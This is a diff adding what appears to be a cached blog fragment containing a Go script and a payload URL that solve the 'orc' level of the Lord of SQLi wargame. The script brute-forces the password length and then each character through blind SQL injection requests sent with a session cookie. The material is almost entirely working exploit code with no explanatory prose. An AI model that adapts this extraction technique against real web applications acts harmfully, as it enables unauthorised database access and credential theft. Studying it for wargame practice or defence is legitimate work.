@@ -1,0 +1,423 @@
+I"o<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=%27%20or%20%20ascii(substr(pw,1,1))%3C150%23
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">package</span> <span class="n">main</span>
+
+
+
+<span class="n">import</span> <span class="p">(</span>
+
+	<span class="s2">"bytes"</span>
+
+	<span class="s2">"fmt"</span>
+
+	<span class="s2">"io/ioutil"</span>
+
+	<span class="s2">"log"</span>
+
+	<span class="s2">"net/http"</span>
+
+	<span class="s2">"regexp"</span>
+
+	<span class="s2">"strconv"</span>
+
+	<span class="s2">"time"</span>
+
+<span class="p">)</span>
+
+
+
+<span class="n">const</span> <span class="n">COOKIEVALUE</span> <span class="k">string</span> <span class="p">=</span> <span class="s2">""</span>
+
+
+
+<span class="n">var</span> <span class="n">limit</span> <span class="n">int</span> <span class="p">=</span> <span class="m">50</span>
+
+<span class="n">var</span> <span class="n">index</span> <span class="n">int</span> <span class="p">=</span> <span class="m">0</span>
+
+<span class="n">var</span> <span class="n">payload</span> <span class="p">[]</span><span class="k">string</span>
+
+<span class="n">var</span> <span class="n">pwLength</span> <span class="n">int</span> <span class="p">=</span> <span class="m">0</span>
+
+
+
+<span class="n">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+
+	<span class="p">//</span><span class="n">requestPost</span><span class="p">()</span>
+
+	<span class="n">getLength</span><span class="p">(</span><span class="m">50</span><span class="p">)</span>
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="n">strconv</span><span class="p">.</span><span class="n">Itoa</span><span class="p">(</span><span class="n">pwLength</span><span class="p">))</span>
+
+	<span class="n">index</span> <span class="p">=</span> <span class="m">0</span>
+
+	<span class="n">blidSqlInjection</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span>
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"%v"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="p">}</span>
+
+
+
+<span class="n">func</span> <span class="n">matchFind</span><span class="p">(</span><span class="n">targetString</span> <span class="k">string</span><span class="p">)</span> <span class="n">bool</span> <span class="p">{</span>
+
+	<span class="n">r</span><span class="p">,</span> <span class="n">_</span> <span class="p">:=</span> <span class="n">regexp</span><span class="p">.</span><span class="nf">Compile</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hello.*&lt;/h2&gt;"</span><span class="p">)</span>
+
+	<span class="n">var</span> <span class="n">result</span> <span class="p">[]</span><span class="k">string</span>
+
+
+
+	<span class="n">result</span> <span class="p">=</span> <span class="n">r</span><span class="p">.</span><span class="n">FindAllString</span><span class="p">(</span><span class="n">targetString</span><span class="p">,</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">&gt;</span> <span class="m">0</span> <span class="p">{</span>
+
+		<span class="n">return</span> <span class="nb">true</span>
+
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+		<span class="n">return</span> <span class="nb">false</span>
+
+	<span class="p">}</span>
+
+<span class="p">}</span>
+
+
+
+<span class="n">func</span> <span class="n">requestPost</span><span class="p">()</span> <span class="p">{</span>
+
+	<span class="n">url</span> <span class="p">:=</span> <span class="s2">"https://los.rubiya.kr/gate.php"</span>
+
+
+
+	<span class="n">data</span> <span class="p">:=</span> <span class="p">[]</span><span class="n">byte</span><span class="p">(`{</span><span class="s2">"hello"</span><span class="p">:</span> <span class="s2">"world"</span><span class="p">}`)</span>
+
+
+
+	<span class="n">req</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">http</span><span class="p">.</span><span class="n">NewRequest</span><span class="p">(</span><span class="s2">"POST"</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">bytes</span><span class="p">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading request. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="p">//</span> <span class="k">Set</span> <span class="n">headers</span>
+
+	<span class="n">req</span><span class="p">.</span><span class="n">Header</span><span class="p">.</span><span class="k">Set</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span> <span class="s2">"application/json"</span><span class="p">)</span>
+
+	<span class="n">req</span><span class="p">.</span><span class="n">Header</span><span class="p">.</span><span class="k">Set</span><span class="p">(</span><span class="s2">"Host"</span><span class="p">,</span> <span class="s2">"httpbin.org"</span><span class="p">)</span>
+
+
+
+	<span class="p">//</span> <span class="n">Create</span> <span class="k">and</span> <span class="n">Add</span> <span class="n">cookie</span> <span class="k">to</span> <span class="n">request</span>
+
+	<span class="n">cookie</span> <span class="p">:=</span> <span class="n">http</span><span class="p">.</span><span class="n">Cookie</span><span class="p">{</span><span class="n">Name</span><span class="p">:</span> <span class="s2">"PHPSESSID"</span><span class="p">,</span> <span class="n">Value</span><span class="p">:</span> <span class="n">COOKIEVALUE</span><span class="p">}</span>
+
+	<span class="n">req</span><span class="p">.</span><span class="n">AddCookie</span><span class="p">(&amp;</span><span class="n">cookie</span><span class="p">)</span>
+
+
+
+	<span class="p">//</span> <span class="k">Set</span> <span class="n">client</span> <span class="n">timeout</span>
+
+	<span class="n">client</span> <span class="p">:=</span> <span class="p">&amp;</span><span class="n">http</span><span class="p">.</span><span class="n">Client</span><span class="p">{</span><span class="n">Timeout</span><span class="p">:</span> <span class="n">time</span><span class="p">.</span><span class="n">Second</span> <span class="p">*</span> <span class="m">10</span><span class="p">}</span>
+
+
+
+	<span class="p">//</span> <span class="n">Validate</span> <span class="n">cookie</span> <span class="k">and</span> <span class="n">headers</span> <span class="n">are</span> <span class="n">attached</span>
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">Cookies</span><span class="p">())</span>
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">Header</span><span class="p">)</span>
+
+
+
+	<span class="p">//</span> <span class="nf">Send</span> <span class="n">request</span>
+
+	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">client</span><span class="p">.</span><span class="k">Do</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading response. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+	<span class="n">defer</span> <span class="n">resp</span><span class="p">.</span><span class="n">Body</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+
+
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"response Status:"</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">Status</span><span class="p">)</span>
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"response Headers:"</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">Header</span><span class="p">)</span>
+
+
+
+	<span class="n">body</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">ioutil</span><span class="p">.</span><span class="n">ReadAll</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">Body</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading body. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Printf</span><span class="p">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>
+
+
+
+<span class="p">}</span>
+
+
+
+<span class="n">func</span> <span class="n">getLength</span><span class="p">(</span><span class="n">start</span> <span class="n">int</span><span class="p">)</span> <span class="n">int</span> <span class="p">{</span>
+
+	<span class="p">//</span><span class="n">https</span><span class="p">://</span><span class="n">los</span><span class="p">.</span><span class="n">rubiya</span><span class="p">.</span><span class="n">kr</span><span class="p">/</span><span class="n">chall</span><span class="p">/</span><span class="n">orc_60e5b360f95c1f9688e4f3a86c5dd494</span><span class="p">.</span><span class="n">php</span><span class="p">?</span><span class="n">pw</span><span class="p">=%</span><span class="m">27</span><span class="p">%</span><span class="m">20</span><span class="k">or</span><span class="p">%</span><span class="m">20</span><span class="p">%</span><span class="m">20</span><span class="n">ascii</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span><span class="m">1</span><span class="p">,</span><span class="m">1</span><span class="p">))%</span><span class="m">3</span><span class="n">C150</span><span class="p">%</span><span class="m">23</span>
+
+
+
+	<span class="k">if</span> <span class="n">index</span> <span class="p">&gt;=</span> <span class="n">limit</span> <span class="p">||</span> <span class="n">start</span> <span class="p">==</span> <span class="m">0</span> <span class="p">{</span>
+
+		<span class="n">return</span> <span class="p">-</span><span class="m">1</span>
+
+	<span class="p">}</span>
+
+	<span class="n">url1</span> <span class="p">:=</span> <span class="s2">"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=pw=%27%20or%20%20length(pw)="</span>
+
+	<span class="n">url2</span> <span class="p">:=</span> <span class="n">strconv</span><span class="p">.</span><span class="n">Itoa</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">+</span> <span class="s2">"%23"</span>
+
+
+
+	<span class="n">data</span> <span class="p">:=</span> <span class="p">[]</span><span class="n">byte</span><span class="p">(`{</span><span class="s2">"hello"</span><span class="p">:</span> <span class="s2">"world"</span><span class="p">}`)</span>
+
+
+
+	<span class="n">url</span> <span class="p">:=</span> <span class="n">url1</span> <span class="p">+</span> <span class="n">url2</span>
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"Request URL : "</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+
+	<span class="n">req</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">http</span><span class="p">.</span><span class="n">NewRequest</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">bytes</span><span class="p">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading request. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="p">//</span> <span class="k">Set</span> <span class="n">headers</span>
+
+	<span class="n">req</span><span class="p">.</span><span class="n">Header</span><span class="p">.</span><span class="k">Set</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span> <span class="s2">"application/json"</span><span class="p">)</span>
+
+
+
+	<span class="p">//</span> <span class="n">Create</span> <span class="k">and</span> <span class="n">Add</span> <span class="n">cookie</span> <span class="k">to</span> <span class="n">request</span>
+
+	<span class="n">cookie</span> <span class="p">:=</span> <span class="n">http</span><span class="p">.</span><span class="n">Cookie</span><span class="p">{</span><span class="n">Name</span><span class="p">:</span> <span class="s2">"PHPSESSID"</span><span class="p">,</span> <span class="n">Value</span><span class="p">:</span> <span class="n">COOKIEVALUE</span><span class="p">}</span>
+
+	<span class="n">req</span><span class="p">.</span><span class="n">AddCookie</span><span class="p">(&amp;</span><span class="n">cookie</span><span class="p">)</span>
+
+
+
+	<span class="p">//</span> <span class="k">Set</span> <span class="n">client</span> <span class="n">timeout</span>
+
+	<span class="n">client</span> <span class="p">:=</span> <span class="p">&amp;</span><span class="n">http</span><span class="p">.</span><span class="n">Client</span><span class="p">{</span><span class="n">Timeout</span><span class="p">:</span> <span class="n">time</span><span class="p">.</span><span class="n">Second</span> <span class="p">*</span> <span class="m">10</span><span class="p">}</span>
+
+
+
+	<span class="p">//</span> <span class="nf">Send</span> <span class="n">request</span>
+
+	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">client</span><span class="p">.</span><span class="k">Do</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading response. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+	<span class="n">defer</span> <span class="n">resp</span><span class="p">.</span><span class="n">Body</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+
+
+
+	<span class="p">//</span><span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"response Status:"</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">Status</span><span class="p">)</span>
+
+
+
+	<span class="n">body</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">ioutil</span><span class="p">.</span><span class="n">ReadAll</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">Body</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading body. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="n">matchResult</span> <span class="p">:=</span> <span class="n">matchFind</span><span class="p">(</span><span class="k">string</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
+
+
+
+	<span class="k">if</span> <span class="n">matchResult</span> <span class="p">==</span> <span class="nb">true</span> <span class="p">{</span>
+
+		<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"Length : "</span><span class="p">,</span> <span class="n">strconv</span><span class="p">.</span><span class="n">Itoa</span><span class="p">(</span><span class="n">start</span><span class="p">))</span>
+
+		<span class="n">pwLength</span> <span class="p">=</span> <span class="n">start</span>
+
+		<span class="n">return</span> <span class="n">start</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="n">index</span><span class="p">++</span>
+
+
+
+	<span class="k">if</span> <span class="n">matchResult</span> <span class="p">==</span> <span class="nb">true</span> <span class="p">{</span>
+
+		<span class="n">getLength</span><span class="p">(</span><span class="n">start</span> <span class="p">/</span> <span class="m">2</span><span class="p">)</span>
+
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+		<span class="n">getLength</span><span class="p">(</span><span class="n">start</span> <span class="p">-</span> <span class="m">1</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="n">return</span> <span class="p">-</span><span class="m">1</span>
+
+<span class="p">}</span>
+
+
+
+<span class="n">func</span> <span class="n">blidSqlInjection</span><span class="p">(</span><span class="n">start</span> <span class="n">int</span><span class="p">,</span> <span class="n">pwIndex</span> <span class="n">int</span><span class="p">)</span> <span class="n">int</span> <span class="p">{</span>
+
+	<span class="p">//</span><span class="n">https</span><span class="p">://</span><span class="n">los</span><span class="p">.</span><span class="n">rubiya</span><span class="p">.</span><span class="n">kr</span><span class="p">/</span><span class="n">chall</span><span class="p">/</span><span class="n">orc_60e5b360f95c1f9688e4f3a86c5dd494</span><span class="p">.</span><span class="n">php</span><span class="p">?</span><span class="n">pw</span><span class="p">=%</span><span class="m">27</span><span class="p">%</span><span class="m">20</span><span class="k">or</span><span class="p">%</span><span class="m">20</span><span class="p">%</span><span class="m">20</span><span class="n">ascii</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span><span class="m">1</span><span class="p">,</span><span class="m">1</span><span class="p">))%</span><span class="m">3</span><span class="n">C150</span><span class="p">%</span><span class="m">23</span>
+
+
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">pwLength</span><span class="p">,</span> <span class="n">pwIndex</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">start</span> <span class="p">==</span> <span class="n">pwLength</span> <span class="p">&amp;&amp;</span> <span class="n">pwLength</span> <span class="p">==</span> <span class="n">pwIndex</span> <span class="p">{</span>
+
+		<span class="n">return</span> <span class="p">-</span><span class="m">1</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="k">if</span> <span class="n">pwLength</span> <span class="p">&lt;</span> <span class="n">pwIndex</span> <span class="p">{</span>
+
+		<span class="n">return</span> <span class="p">-</span><span class="m">1</span>
+
+	<span class="p">}</span>
+
+	<span class="n">url1</span> <span class="p">:=</span> <span class="s2">"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=pw=%27%20or%20%20ascii(substr(pw,"</span> <span class="p">+</span> <span class="n">strconv</span><span class="p">.</span><span class="n">Itoa</span><span class="p">(</span><span class="n">pwIndex</span><span class="p">)</span> <span class="p">+</span> <span class="s2">",1))="</span>
+
+	<span class="n">url2</span> <span class="p">:=</span> <span class="n">strconv</span><span class="p">.</span><span class="n">Itoa</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">+</span> <span class="s2">"%23"</span>
+
+
+
+	<span class="n">data</span> <span class="p">:=</span> <span class="p">[]</span><span class="n">byte</span><span class="p">(`{</span><span class="s2">"hello"</span><span class="p">:</span> <span class="s2">"world"</span><span class="p">}`)</span>
+
+
+
+	<span class="n">url</span> <span class="p">:=</span> <span class="n">url1</span> <span class="p">+</span> <span class="n">url2</span>
+
+	<span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"Request URL : "</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+
+	<span class="n">req</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">http</span><span class="p">.</span><span class="n">NewRequest</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">bytes</span><span class="p">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading request. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="p">//</span> <span class="k">Set</span> <span class="n">headers</span>
+
+	<span class="n">req</span><span class="p">.</span><span class="n">Header</span><span class="p">.</span><span class="k">Set</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span> <span class="s2">"application/json"</span><span class="p">)</span>
+
+
+
+	<span class="p">//</span> <span class="n">Create</span> <span class="k">and</span> <span class="n">Add</span> <span class="n">cookie</span> <span class="k">to</span> <span class="n">request</span>
+
+	<span class="n">cookie</span> <span class="p">:=</span> <span class="n">http</span><span class="p">.</span><span class="n">Cookie</span><span class="p">{</span><span class="n">Name</span><span class="p">:</span> <span class="s2">"PHPSESSID"</span><span class="p">,</span> <span class="n">Value</span><span class="p">:</span> <span class="n">COOKIEVALUE</span><span class="p">}</span>
+
+	<span class="n">req</span><span class="p">.</span><span class="n">AddCookie</span><span class="p">(&amp;</span><span class="n">cookie</span><span class="p">)</span>
+
+
+
+	<span class="p">//</span> <span class="k">Set</span> <span class="n">client</span> <span class="n">timeout</span>
+
+	<span class="n">client</span> <span class="p">:=</span> <span class="p">&amp;</span><span class="n">http</span><span class="p">.</span><span class="n">Client</span><span class="p">{</span><span class="n">Timeout</span><span class="p">:</span> <span class="n">time</span><span class="p">.</span><span class="n">Second</span> <span class="p">*</span> <span class="m">10</span><span class="p">}</span>
+
+
+
+	<span class="p">//</span> <span class="nf">Send</span> <span class="n">request</span>
+
+	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">client</span><span class="p">.</span><span class="k">Do</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading response. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+	<span class="n">defer</span> <span class="n">resp</span><span class="p">.</span><span class="n">Body</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+
+
+
+	<span class="p">//</span><span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"response Status:"</span><span class="p">,</span> <span class="n">resp</span><span class="p">.</span><span class="n">Status</span><span class="p">)</span>
+
+
+
+	<span class="n">body</span><span class="p">,</span> <span class="n">err</span> <span class="p">:=</span> <span class="n">ioutil</span><span class="p">.</span><span class="n">ReadAll</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">Body</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">err</span> <span class="c1">!= nil {
+</span>
+		<span class="nb">log</span><span class="p">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s2">"Error reading body. "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="n">matchResult</span> <span class="p">:=</span> <span class="n">matchFind</span><span class="p">(</span><span class="k">string</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
+
+
+
+	<span class="n">index</span><span class="p">++</span>
+
+	<span class="k">if</span> <span class="n">matchResult</span> <span class="p">==</span> <span class="nb">true</span> <span class="p">{</span>
+
+		<span class="p">//</span><span class="n">fmt</span><span class="p">.</span><span class="n">Println</span><span class="p">(</span><span class="s2">"Length : "</span><span class="p">,</span> <span class="n">strconv</span><span class="p">.</span><span class="n">Itoa</span><span class="p">(</span><span class="n">start</span><span class="p">))</span>
+
+		<span class="p">//</span><span class="n">return</span> <span class="n">start</span>
+
+		<span class="n">payload</span> <span class="p">=</span> <span class="n">append</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="k">string</span><span class="p">(</span><span class="n">start</span><span class="p">))</span>
+
+		<span class="n">blidSqlInjection</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">pwIndex</span><span class="p">+</span><span class="m">1</span><span class="p">)</span>
+
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+
+		<span class="n">blidSqlInjection</span><span class="p">(</span><span class="n">start</span><span class="p">+</span><span class="m">1</span><span class="p">,</span> <span class="n">pwIndex</span><span class="p">)</span>
+
+	<span class="p">}</span>
+
+
+
+	<span class="n">return</span> <span class="p">-</span><span class="m">1</span>
+
+<span class="p">}</span>
+
+
+
+</code></pre></div></div>
+
+:ET
